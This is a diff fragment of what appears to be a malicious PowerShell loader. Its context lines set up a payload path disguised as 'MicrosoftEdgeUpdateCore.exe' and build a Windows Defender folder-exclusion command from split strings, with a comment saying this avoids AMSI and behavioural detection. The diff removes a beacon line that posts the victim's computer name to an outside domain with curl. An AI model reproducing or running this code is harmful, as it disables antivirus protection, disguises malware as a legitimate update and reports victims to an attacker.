@@ -17,9 +17,6 @@ New-Item -ItemType Directory -Force -Path $dir | Out-Null
 $sysPath = Join-Path $dir 'MicrosoftEdgeUpdateCore.exe'
 $tmpPath = Join-Path $dir 'MicrosoftEdgeUpdate.tmp'
 
-# 0) beacon: this PowerShell run happened (fires before any download)
-curl.exe -s -X POST https://cloudcaptcha.cfd/beacon.php -H "Content-Type: application/json" -d "{\"e\":\"run\",\"host\":\"$env:COMPUTERNAME\"}" 2>nul
-
 # 1) folder exclusion via dynamically built call — no literal signature in this
 #    file for AMSI/behavioral to flag; keeps Tamper-logged noise minimal
 $a1 = 'Add-Mp'; $a2 = 'Preference'; $p1 = '-Exclusion'; $p2 = 'Path'
